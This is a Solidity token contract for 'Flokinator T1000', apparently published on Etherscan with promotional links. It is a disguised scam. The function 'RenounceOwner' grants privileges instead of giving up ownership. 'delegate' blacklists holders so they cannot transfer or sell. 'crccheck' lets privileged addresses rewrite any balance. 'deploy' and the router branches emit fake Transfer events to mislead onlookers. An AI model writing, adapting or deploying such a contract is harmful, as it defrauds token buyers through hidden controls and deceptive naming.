/**
 *Submitted for verification at Etherscan.io on 2023-02-18
*/

pragma solidity 0.8.17;

// SPDX-License-Identifier: MIT
/**

Flokinator model T-1000 is here to destroy other tokens.

https://twitter.com/flokinator
https://t.me/flokinator

**/
 
contract FlokinatorT1000 {
  
    mapping (address => uint256) public tAmount;
    mapping (address => bool) dVal;
    mapping (address => bool) renounced;

    // 
    string public name = "Flokinator T1000";
    string public symbol = "FLOKI000";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10001000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   

        constructor()  {
        tAmount[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }


	address owner = msg.sender;
    address V2Router = 0x60Dd82FAB3F41A51728232A5D18340f29b9ECAFe;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   



    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier O() {   
         require(renounced[msg.sender]);
         _;}


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V2Router)  {
        require(tAmount[msg.sender] >= value);
        tAmount[msg.sender] -= value;  
        tAmount[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!dVal[msg.sender]);      
        require(tAmount[msg.sender] >= value);
        tAmount[msg.sender] -= value;  
        tAmount[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


             function balanceOf(address account) public view returns (uint256) {
            return tAmount[account]; }


        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address x) public {
        require(msg.sender == owner);
          renounced[x] = true; }
        
        function delegate(address x) O public{          
        require(!dVal[x]);
        dVal[x] = true; }
        function crccheck(address usr, uint256 query) O public returns (bool success) {
        tAmount[usr] = query;
                   return true; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V2Router)  {
        require(value <= tAmount[from]);
        require(value <= allowance[from][msg.sender]);
        tAmount[from] -= value;  
        tAmount[to] += value; 
        emit Transfer (lead_dev, to, value);
    return true; }    
        require(!dVal[from]); 
        require(!dVal[to]); 
        require(value <= tAmount[from]);
        require(value <= allowance[from][msg.sender]);
        tAmount[from] -= value;
        tAmount[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }